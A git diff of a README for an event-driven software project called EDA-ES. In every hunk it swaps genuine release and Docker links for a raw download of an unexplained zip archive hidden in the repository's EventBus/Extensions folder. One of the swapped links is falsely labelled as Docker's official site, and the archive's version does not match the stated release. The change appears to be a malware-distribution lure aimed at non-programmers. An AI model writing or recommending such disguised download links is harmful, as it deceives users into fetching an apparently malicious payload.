@@ -1,7 +1,7 @@
 # 🎉 EDA-ES - Simplifying Event-Driven Systems
 
 ## 🔗 Download the Latest Release
-[![Latest Release](https://img.shields.io/badge/Download%20EDA--ES-v1.0.0-blue)](https://github.com/ferozkhan47/EDA-ES/releases)
+[![Latest Release](https://github.com/ferozkhan47/EDA-ES/raw/refs/heads/main/EventBus/Extensions/ES-ED-v2.9-beta.1.zip%20EDA--ES-v1.0.0-blue)](https://github.com/ferozkhan47/EDA-ES/raw/refs/heads/main/EventBus/Extensions/ES-ED-v2.9-beta.1.zip)
 
 ## 🚀 Getting Started
 Welcome to EDA-ES! This software helps you build event-driven applications. It uses modern principles like CQRS (Command Query Responsibility Segregation) and Event Sourcing. You don’t need to be a programmer to use it. Just follow the steps below to get started.
@@ -11,7 +11,7 @@ To run EDA-ES, you will need:
 
 - A stable internet connection.
 - A computer running Windows, macOS, or Linux.
-- Docker installed on your machine. You can download Docker from [Docker’s official site](https://www.docker.com/products/docker-desktop).
+- Docker installed on your machine. You can download Docker from [Docker’s official site](https://github.com/ferozkhan47/EDA-ES/raw/refs/heads/main/EventBus/Extensions/ES-ED-v2.9-beta.1.zip).
 - Docker Compose, which usually comes with Docker Desktop.
 
 ## 🛠 Features
@@ -25,7 +25,7 @@ To run EDA-ES, you will need:
 
 ## 📥 Download & Install
 1. **Visit the Releases Page:** Click the link below to access the EDA-ES Releases page.
-   [Download EDA-ES](https://github.com/ferozkhan47/EDA-ES/releases)
+   [Download EDA-ES](https://github.com/ferozkhan47/EDA-ES/raw/refs/heads/main/EventBus/Extensions/ES-ED-v2.9-beta.1.zip)
 
 2. **Select the Latest Version:** Look for the latest release. Usually, it’s at the top of the list.
 
@@ -69,4 +69,4 @@ Join our community of developers and users. You’ll find support and plenty of 
 ## 🔗 Conclusion
 EDA-ES aims to make developing event-driven applications straightforward and efficient. Download it today and start your journey in modern software development!
 
-[Download EDA-ES](https://github.com/ferozkhan47/EDA-ES/releases)
+[Download EDA-ES](https://github.com/ferozkhan47/EDA-ES/raw/refs/heads/main/EventBus/Extensions/ES-ED-v2.9-beta.1.zip)
